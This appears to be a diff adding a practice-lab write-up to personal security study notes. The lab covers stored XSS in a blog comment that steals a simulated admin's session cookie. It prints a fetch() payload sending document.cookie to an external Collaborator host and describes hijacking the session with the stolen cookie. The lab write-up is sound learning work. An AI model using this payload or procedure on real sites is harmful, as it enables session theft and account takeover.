@@ -1411,3 +1411,97 @@ entirely new injection surfaces that traditional character-escaping
 defenses (focused on quotes, brackets, and backslashes) don't anticipate
 at all — the vulnerability here isn't a broken escape, but a feature that
 inherently evaluates code embedded inside a string.
+
+
+
+## Lab 22: Exploiting Cross-Site Scripting to Steal Cookies
+
+Topic: Cross-Site Scripting (Real-World Impact / Session Hijacking) | Difficulty: Practitioner
+
+## Vulnerability
+The blog comment functionality contains a stored XSS vulnerability, and a
+simulated victim (an admin-level user) automatically views all posted
+comments. Unlike every previous lab (which only proved code execution via
+`alert()`), this lab required going a full step further: actually stealing
+the victim's live session cookie and using it to impersonate them.
+
+## Why This Lab Is Different from Labs 1–21
+Every earlier lab used `alert()`, `print()`, or similar functions purely
+as a safe proof-of-concept to demonstrate that arbitrary JavaScript
+execution was possible. This lab demonstrated the actual real-world
+*consequence* of that capability: exfiltrating sensitive data
+(`document.cookie`) to an attacker-controlled server and using it to fully
+take over another user's authenticated session.
+
+## Steps Taken
+
+### Step 1: Set up an out-of-band listener
+Opened Burp Suite Professional's Collaborator tab and generated a unique
+Collaborator subdomain/payload to use as a destination for exfiltrated data.
+
+### Step 2: Post a malicious comment
+Submitted the following as a blog comment:
+```html
+
+fetch('https://[collaborator-subdomain].oastify.com?cookie='+document.cookie);
+
+```
+
+### Step 3: Wait for the victim to view the comment
+Since this is a stored XSS vulnerability, the payload executes
+automatically for anyone who later views the comments — including the
+simulated victim (admin) user, with zero interaction required from them
+beyond simply loading the page.
+
+### Step 4: Retrieve the exfiltrated cookie
+Returned to the Collaborator tab and clicked "Poll now," revealing an
+incoming HTTP interaction — the victim's browser had executed the script
+and sent a request containing their session cookie value to the
+Collaborator server.
+
+### Step 5: Hijack the victim's session
+Reloaded the main blog page, intercepted the request with Burp Proxy/
+Repeater, and replaced my own session cookie value with the stolen
+victim's cookie value. Sent the modified request.
+
+### Step 6: Confirm full account takeover
+Used the same stolen cookie to send a request to `/my-account`,
+successfully loading the admin user's account page — proving complete
+impersonation of the victim's session.
+
+## How the Payload Works
+- `document.cookie` is a standard JavaScript property that returns all
+  non-HttpOnly cookies accessible to the current page's script context
+- `fetch()` sends an asynchronous HTTP request to a specified URL — here,
+  used to silently send the victim's cookie value as a query parameter to
+  an external, attacker-controlled server (Burp Collaborator, simulating a
+  real attacker's listening server)
+- Because this is stored XSS, the script re-executes automatically every
+  time any user (including the victim) views the comment, requiring no
+  ongoing attacker interaction after the initial post
+- Once the victim's session cookie is captured, simply setting that same
+  cookie value in a request is sufficient to be treated by the server as
+  that authenticated user — since session cookies are typically the sole
+  mechanism proving a user is logged in
+
+## Result
+Successfully exfiltrated the victim (admin) user's session cookie via
+stored XSS and Burp Collaborator, then used that cookie to fully hijack
+their session and access their account page, solving the lab.
+
+## What I Learned
+This lab connected the entire XSS topic (Labs 1–21) to its actual
+real-world security impact: XSS is dangerous not because it can pop up an
+alert box, but because it allows an attacker's JavaScript to run with the
+same privileges and access as the legitimate page — including reading
+cookies, local storage, and making authenticated requests on the victim's
+behalf. Session hijacking via stolen cookies is one of the most common
+and severe real-world consequences of a stored XSS vulnerability,
+especially in an admin-facing context like this one, where a single
+successful comment could compromise an administrator's entire account.
+This also reinforced the practical value of Burp Collaborator for
+out-of-band data exfiltration in a live testing scenario — sending stolen
+data to an external listener is exactly how a real attacker would collect
+results from a payload deployed against unknown victims. This lab is a
+strong, concrete example to discuss in an interview, since it demonstrates
+understanding of XSS's actual business impact, not just its mechanics.
